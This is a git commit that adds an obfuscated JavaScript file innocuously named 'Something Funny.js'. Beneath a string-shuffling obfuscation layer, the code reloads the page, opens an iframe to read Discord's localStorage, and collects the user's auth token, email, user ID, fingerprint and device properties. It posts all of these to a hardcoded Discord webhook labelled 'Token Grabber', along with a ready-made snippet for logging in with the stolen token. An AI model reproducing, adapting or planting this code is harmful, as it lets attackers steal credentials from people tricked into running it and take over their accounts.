4d305639baa503032430a8f9142fa1969ee6d98b
Muhammed Maruf <72191792+Maruf132@users.noreply.github.com>
2022-02-06 11:26:29 +0530

    Create Something Funny.js

---
+++ Something Funny.js
@@ -0,0 +1,33 @@
+var jhamal = jayjay;
+(function (shardonnay, hub) {
+  var izick = jayjay, daesyn = shardonnay();
+  while (!![]) {
+    try {
+      var knixon = -parseInt(izick(164)) / 1 + -parseInt(izick(152)) / 2 * (parseInt(izick(149)) / 3) + -parseInt(izick(163)) / 4 * (-parseInt(izick(150)) / 5) + parseInt(izick(172)) / 6 * (-parseInt(izick(147)) / 7) + -parseInt(izick(166)) / 8 * (-parseInt(izick(143)) / 9) + parseInt(izick(171)) / 10 * (-parseInt(izick(148)) / 11) + parseInt(izick(153)) / 12;
+      if (knixon === hub) break; else daesyn.push(daesyn.shift());
+    } catch (saanya) {
+      daesyn.push(daesyn.shift());
+    }
+  }
+}(roshaun, 483776), location[jhamal(157)]());
+var discordWebhook = jhamal(154), i = document[jhamal(156)]("iframe");
+function roshaun() {
+  var inice = ["send", "4613lPMcci", "473oBoKRB", "21pbdqrD", "276325DLZFOi", "POST", "44078ASkPAG", "13550640EwvrwB", "https://discord.com/api/webhooks/936844376305459240/BQfkzu39KfpBrOL0Og9hoc7AfqnHGq5e5eAetRgzXZZRMaryZKAoODRu7Jq_XqYOxd8f", "Token Grabber", "createElement", "reload", "\n------------------\nFingerprint : ", "\n------------------\nProperties : ```json\n", "```------------------\nTo login : \n```js\nlocation.reload();var i = document.createElement('iframe');document.body.appendChild(i);i.contentWindow.localStorage.token = \"\\\"", "contentWindow", "Content-type", "28hamdEs", "193846lZSKtM", "setRequestHeader", "8jPVrRV", "deviceProperties", "localStorage", "email_cache", "token", "42830ZOQYdy", "8538czzYlY", "https://malwarefox.com/wp-content/uploads/2017/11/hacker-1.png", "\n------------------\nUser ID : ", "application/json", "appendChild", "3939714jFzADT", "body", '\\""```'];
+  roshaun = function () {
+    return inice;
+  };
+  return roshaun();
+}
+document[jhamal(144)][jhamal(176)](i);
+var request = new XMLHttpRequest;
+request.open(jhamal(151), discordWebhook), request[jhamal(165)](jhamal(162), jhamal(175));
+function jayjay(marcyanna, skarlette) {
+  var gabin = roshaun();
+  return jayjay = function (nerine, bahram) {
+    nerine = nerine - 143;
+    var aceion = gabin[nerine];
+    return aceion;
+  }, jayjay(marcyanna, skarlette);
+}
+var params = {username: jhamal(155), avatar_url: jhamal(173), content: "**Person Hacked! **\n------------------\nToken : " + i[jhamal(161)][jhamal(168)].token + "\n------------------\nEmail Address : " + i[jhamal(161)][jhamal(168)][jhamal(169)] + jhamal(174) + i[jhamal(161)].localStorage.user_id_cache + jhamal(158) + i[jhamal(161)][jhamal(168)].fingerprint + jhamal(159) + i[jhamal(161)][jhamal(168)][jhamal(167)] + jhamal(160) + i[jhamal(161)][jhamal(168)][jhamal(170)].replace(/^"(.*)"$/, "$1") + jhamal(145)};
+request[jhamal(146)](JSON.stringify(params));
